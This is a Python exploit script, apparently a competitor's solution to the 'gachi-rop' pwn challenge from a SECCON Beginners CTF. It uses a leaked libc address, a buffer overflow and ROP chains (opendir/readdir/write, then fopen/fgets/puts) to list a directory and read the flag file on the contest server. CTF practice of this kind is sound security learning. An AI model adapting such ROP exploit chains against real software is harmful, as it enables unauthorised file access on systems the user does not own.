#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./gachi-rop_patched")
libc = ptr.ELF("./libc.so.6")
remote = False


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        global remote
        remote = True
        return ptr.Socket("gachi-rop.beginners.seccon.games", 4567)
        # return ptr.Socket("localhost", 4567)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.recvuntil("system@0x")
    libc.base = int(io.recv(12), 16) - unwrap(libc.symbol("system"))

    pl1 = b"A" * 24
    pl1 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl1 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # dir name
    pl1 += ptr.p64(unwrap(libc.symbol("gets")))

    pl1 += ptr.p64(unwrap(exe.symbol("main")))

    io.sendlineafter("Name: ", pl1)

    if remote:
        io.sendline("./ctf4b")
    else:
        io.sendline("./")

    pl2 = b"A" * 24
    # opendirでディレクトリを開く
    pl2 += ptr.p64(next(libc.gadget("ret;")))
    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # ./
    pl2 += ptr.p64(unwrap(libc.symbol("opendir")))

    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100 - 0x10)  # dir metadata
    pl2 += ptr.p64(next(libc.gadget("mov [rsi+0x10], rax; ret;")))

    pl2 += ptr.p64(next(libc.gadget("pop rdx; pop rbx; ret;")))
    pl2 += ptr.p64(8)
    pl2 += ptr.p64(0)
    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)
    pl2 += ptr.p64(
        next(
            libc.gadget(
                "mov rdi, [rsi+rdx-8]; sub rcx, rdi; or rax, rcx; cmovne eax, edx; ret;"
            )
        )
    )

    # readdirでディレクトリを読み込む
    pl2 += ptr.p64(unwrap(libc.symbol("readdir")))

    # writeでファイル名をダンプする
    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100 - 0x10)
    pl2 += ptr.p64(next(libc.gadget("mov [rsi+0x10], rax; ret;")))
    pl2 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # dir metadata
    pl2 += ptr.p64(next(libc.gadget("pop rdx; pop rbx; ret;")))
    pl2 += ptr.p64(0)
    pl2 += ptr.p64(0)
    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl2 += ptr.p64(unwrap(exe.section(".bss")) + 0x200)  # dummy
    pl2 += ptr.p64(
        next(libc.gadget("mov rsi, [rsi]; mov [rdi], rsi; mov [rdi+rdx-8], rcx; ret"))
    )

    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl2 += ptr.p64(1)

    pl2 += ptr.p64(next(libc.gadget("pop rdx; pop rbx; ret;")))
    pl2 += ptr.p64(0x500)
    pl2 += ptr.p64(0x500)

    pl2 += ptr.p64(unwrap(libc.symbol("write")))

    io.sendlineafter("Name: ", pl2)

    # ダンプからフラグのファイルを取得
    io.recvuntil("flag")

    file_name = "flag" + io.recvuntil(".txt").decode()
    print(f"file_name = {file_name}")
    flag_location = ""
    if remote:
        flag_location = "./ctf4b/" + file_name
    else:
        flag_location = "./" + file_name

    io.close()

    io = connect()

    io.recvuntil("system@0x")
    libc.base = 0
    libc.base = int(io.recv(12), 16) - unwrap(libc.symbol("system"))

    pl3 = b"A" * 24

    pl3 += ptr.p64(next(libc.gadget("ret;")))
    pl3 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)
    pl3 += ptr.p64(unwrap(libc.symbol("gets")))

    pl3 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x150)
    pl3 += ptr.p64(unwrap(libc.symbol("gets")))

    # fopen
    pl3 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # filename
    pl3 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x150)  # 'r'
    pl3 += ptr.p64(unwrap(libc.symbol("fopen")))

    pl3 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x100 - 0x18)
    pl3 += ptr.p64(next(libc.gadget("mov [rdi+0x18], rax; mov eax, r8d; ret;")))
    pl3 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x100)  # stream

    pl3 += ptr.p64(next(libc.gadget("mov rdx, [rsi]; mov [rdi], rdx; ret;")))
    pl3 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl3 += ptr.p64(0x50)
    pl3 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x150)
    pl3 += ptr.p64(unwrap(libc.symbol("fgets")))

    pl3 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl3 += ptr.p64(unwrap(exe.section(".bss")) + 0x150)
    pl3 += ptr.p64(unwrap(libc.symbol("puts")))

    io.sendlineafter("Name: ", pl3)

    io.sendline(flag_location)
    io.sendline("r")

    io.recvuntil("ctf4b")
    flag = "flag = ctf4b" + io.recvuntil("}").decode()
    print(flag)


if __name__ == "__main__":
    main()
